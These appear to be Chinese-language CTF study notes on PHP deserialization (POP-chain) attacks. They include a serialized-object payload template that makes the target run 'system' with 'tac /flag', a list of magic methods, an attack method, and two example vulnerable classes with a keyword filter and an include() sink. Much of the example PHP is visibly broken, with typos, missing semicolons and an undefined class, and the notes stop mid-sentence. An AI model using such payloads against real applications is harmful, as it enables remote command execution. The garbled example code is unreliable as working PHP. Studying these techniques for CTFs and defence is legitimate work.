## 模板：
```php
<?php
class lt
{
   public $impo;
   public $md51='240610708';
   public $md52='QNKCDZO';
   public function __construct()
   {
      $this->impo = new fin;
   }
}

class fin
{
   public $a = "system";
   public $title = 'tac /flag';
}
$a = new lt();
echo urlencode(serialize($a));
?>
```

## 魔术方法
```
__construct 创建对象是会自动调用

__wakeup 使用unserialize时触发
__destruct 使用unserialize结束后触发

__sleep() 

__call 访问不可访问函数时调用，一般来说对应于$a->b()

__callStatic
__get 读取不可访问变量
__Set 赋值不可访问变量,查询相关的pop链时一般找类似于$a->或者$a->{$name}
__isset
__invoke() 在我们被当作一个函数调用的时候，查询相关的pop链时一般找 类似于$a()
```

## 魔术方法攻击思路：
第一步：寻找 unserialize 函数的参数是否有可控点
第二步：寻找我们的反序列化的目标，重点寻找存在 `__wakeup()` 或 `destruct` 魔法函数的类
第三步：一层一层地研究该类在魔法方法中使用的属性和属性调用的方法，看看是否有可控的属性能实现在当前的调用过程中触发的
第四步：找到我们要控制的属性以后，我们就将要用到的代码部分复制下来，然后构造序列化

## 寻找 POP 链
例子：
```php
class Head{

    pubic function get_file($value){

        $text=base64.encode(file_get_content($value));

        return $text

    }

}

class Show{

    public $source;

    public $var;

    public $class1;

    public function __construct($name='index.php'){

        $this->source=$name;

        echo $this->surce.'welcome'."<br>";

    }

    public function __toString(){

        $content=$this->class1->get_file($this->var);

        echo $content;

        return $content;

    }

    public function _show(){

        if(preg_match('/gopher|http|ftp|https|dict|\.\.|flag|file/i',$this->souce)){

            die('hacker')

        }

    }

    public function change(){

        if(preg_match('/gopher|http|ftp|https|dict|\.\.|flag|file/i',$this->souce)){

            die('hacker')

        }

    }

    public function __get($key){

        $function=$this->$key;

        $this->($key)();

    }
}
```

我们考虑下面的路径：

非预期：我们通过触发我们的 Read 类中的对应函数来获取我们的对应的文件<-我们通过我们 Show 函数中让我们的 class 1 强行等于我们的实例化对象 Read，然后用 toString 方法来调用我们的 Read 类<-我们通过我们的__get 方法来执行我们的 toString 方法。

预期：前面步骤都相同，在于我们怎么调用我们的 toString 方法。我们注意到，我们存在我们的 preg_match 方法，于是，我们在执行 `preg_match` 方法的时候，就可以执行我们的 `__toString` 函数。

```
$s1=new Show();
$s1->class1=new Read()
$s2=new Class();
$s2->source=$s1;
```

例二：
```php
<?php

class vox{

    protected $headset;

    public $sound;

    public function fun($pulse){

        include($pulse);

    }

    public function __invoke(){

        $this->fun($this->headset);

    }

}

class Saw{

    public $fearless;

    public $gun;

    public function __construct(){

        $this->fearless=$file;

        echo $this->fearless;

    }

    public function __toString(){

        $this->gun['gun']->fearless;

        return "Saw"

    }

    public function _pain(){

        if($this->fearless){

            highlight_file($this->fearless);

        }

    }

    public function __wakeup(){

        if(preg_match("/http|ftp/i",this->fearless)){

            echo"Does it hurt?";

            $this->fearless="index.php";

        }

    }

}

class Petal{

    public $seed;

    public function __construct(){

        $this->seed=array();

    }

    public function __get($fun){

        $Nourishment=$this->seed;

        return $Nourishment();

    }

}
```

首先我们找到我们的函数的起点和我们的终点，我们反序列化的起点一般需要以我们的 wakeup 或者我们的__destruct 来作为我们的起点。

我们反序列化的终点一般来说需要以我们的某一个函数的某一个漏洞函数作为我们的终点，例如我们的 `include` 等函数。

在我们本题中，我们应该构造我们的链如下所示：
